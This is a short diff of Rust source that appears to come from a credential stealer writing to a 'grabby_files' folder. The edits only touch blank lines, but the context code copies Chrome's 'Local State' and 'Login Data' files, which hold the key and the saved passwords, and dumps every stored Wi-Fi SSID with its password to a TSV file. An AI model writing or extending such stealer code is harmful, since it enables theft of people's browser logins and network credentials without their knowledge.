@@ -122,6 +122,7 @@ fn chrome_export(browser_path: &str) {
     let local_state = format!("{}\\AppData\\Local\\{}\\User Data\\Local State", USER_PROFILE.to_string(), browser_path);
     let login_data = format!("{}\\AppData\\Local\\{}\\User Data\\Default\\Login Data", USER_PROFILE.to_string(), browser_path);
     if Path::new(&local_state).exists() && Path::new(&login_data).exists() {
+        
         fs::copy(local_state, "grabby_files/chrome/Local State").expect("err");
         fs::copy(login_data, "grabby_files/chrome/Login Data").expect("err");
     }
@@ -157,7 +158,9 @@ fn wifi_export() {
         .unwrap();
 
     for line in resp.split("\r\n") {
+        
         if line.contains(": ") {
+
             let ssid = line.split(": ").nth(1).unwrap().replace("\t", "");
 
             let resp2 = String::from_utf8(
@@ -176,7 +179,6 @@ fn wifi_export() {
                     wifi_logins = format!("{}\n{}\t{}", wifi_logins, ssid, password);
                 }
             }
-
         }
     }
     fs::write("grabby_files/wifi/logins.tsv", wifi_logins).expect("err");
